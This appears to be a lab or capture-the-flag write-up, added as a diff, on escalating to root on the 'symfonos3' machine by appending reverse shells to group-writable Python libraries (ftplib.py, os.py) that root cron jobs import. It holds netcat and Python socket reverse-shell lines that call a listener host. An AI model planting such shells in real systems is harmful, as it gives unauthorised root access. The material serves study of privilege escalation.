@@ -1,0 +1,101 @@
+#writable python lib enum by linpeas....
+
+
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group hades:
+
+  Group gods:
+/usr/lib/python2.7
+/usr/lib/python2.7/numbers.py
+/usr/lib/python2.7/mailbox.py
+/usr/lib/python2.7/plistlib.pyc
+/usr/lib/python2.7/pydoc.pyc
+/usr/lib/python2.7/SimpleHTTPServer.py
+#)You_can_write_even_more_files_inside_last_directory
+/etc/python2.7/sitecustomize.py
+
+
+we've found these are writable by us...
+
+and let's enumerate where these libraries are using...by root to run script...
+
+
+after getting the script where it is using...supposr ftplib.py inside the opt...and running as root as cron
+
+
+now we're going to take advantage of writable python library.. 
+
+add our revershell in /usr/lib/python2.7/ftplib
+
+hades@symfonos3:~$ vi /usr/lib/python2.7/ftplib.py
+
+
+...>>>> os.system("nc 192.168.56.37 5555 -e /bin/bash")
+
+
+
+import os
+import sys
+
+# Import SOCKS module if it exists, else standard socket module socket
+try:
+    import SOCKS; socket = SOCKS; del SOCKS # import SOCKS as socket
+    from socket import getfqdn; socket.getfqdn = getfqdn; del getfqdn
+except ImportError:
+    import socket
+from socket import _GLOBAL_DEFAULT_TIMEOUT
+
+__all__ = ["FTP","Netrc"]
+
+os.system("nc 192.168.56.1 5555 -e /bin/bash")
+
+
+like this...
+
+
+take a look what we did...
+
+append our shellcode to a python library which writable by hades user and in the opt directory there was a ftp python script which was using this library ftplib,and the script was running as root,
+
+so when the program will execute as root obviously we'll get the root shell.that how it is going to work.
+
+
+
+$ nc -nlvp 5555
+Listening on 0.0.0.0 5555
+Connection received on 192.168.56.37 44874
+whoami
+root
+
+
+# One more senario.... 
+if there is any script running as cron with root user,(we can check by pspy), and using any library which is writable we'can scape the shell in second case we've os.py library is writable by us and the script which is running as root is imprting this os module.
+
+so we just need to edit the os.py by adding python revershell in the very last or end of the script....
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.44",4444))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+
+
+
+like this and start the listener...
+
+
+# whoami
+root
+# cd /root	
+# ls
+certs
+root.txt
+# cat root.txt
+b0e6c60b82cf96e9855ac1656a9e90c7
+ 
